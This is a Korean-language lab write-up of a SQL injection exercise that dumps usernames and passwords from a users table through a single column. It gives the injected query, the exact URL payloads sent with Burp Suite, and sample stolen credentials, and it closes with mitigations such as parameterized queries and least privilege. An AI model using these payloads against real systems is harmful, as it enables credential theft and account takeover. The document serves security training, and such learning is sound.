# Lab: SQL injection UNION attack, retrieving multiple values in a single column

![title](../../images/SQL_Injection/Lab06_title.png)

## Difficulty

Practitioner

---

## SQL Query

### 기존 Query

```sql
SELECT name, description
FROM products
WHERE category='Gifts';
```

### 공격 Query

```sql
SELECT name, description
FROM products
WHERE category='Gifts'

UNION

SELECT NULL, username || '~' || password
FROM users;
```

### 결과

`users` 테이블의 `username`과 `password`를 `~`로 연결하여 하나의 컬럼으로 출력하였다.

예시

```text
administrator~secret123
carlos~qwerty
```
---

## 발생 가능한 위험

- 사용자 계정(username) 및 비밀번호(password) 유출
- 관리자 계정 탈취
- 개인정보 유출
- 추가적인 권한 상승 및 계정 탈취 공격으로 이어질 수 있다.

---

## 사용한 도구

- Burp Suite Repeater

---

## 실습 과정
1. Burp Suite에서 GET /filter?category= 요청을 Repeater로 전송
2. ORDER BY 이용하여 컬럼 개수를 확인
-> 컬럼 개수: 2
3. '+UNION+SELECT+'test','test'-- 이용하여 문자열 출력되는 컬럼 확인
4. '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- 사용하여 users 테이블에 있는 username, password 컬럼 값 출력<br/>
![payload](../../images/SQL_Injection/Lab06_payload.png)
5. 출련된 정보 이용해 administrator 계정으로 로그인<br/>
![result](../../images/SQL_Injection/Lab06_result.png)

---

## 조회한 데이터

- username
- password

---

## 대응 방안

- Prepared Statement(Parameterized Query)를 사용하여 사용자 입력과 SQL Query를 분리한다.
- 사용자 입력을 SQL Query에 직접 연결하지 않는다.
- 입력값 검증(Input Validation)을 수행하여 SQL Injection Payload가 실행되지 않도록 한다.
- 데이터베이스 계정에 최소 권한(Least Privilege)을 적용하여 불필요한 테이블 및 컬럼 조회를 제한한다.
- 애플리케이션에서 필요한 데이터만 조회하도록 설계하고, 민감한 정보(예: 비밀번호)는 화면에 직접 출력하지 않는다.
- SQL 오류 메시지와 데이터베이스 정보를 사용자에게 노출하지 않는다.

---

## 배운 점
이번 Lab을 통해 여러 컬럼의 값을 한 줄로 출력할 수 있다는 것을 배웠다. 
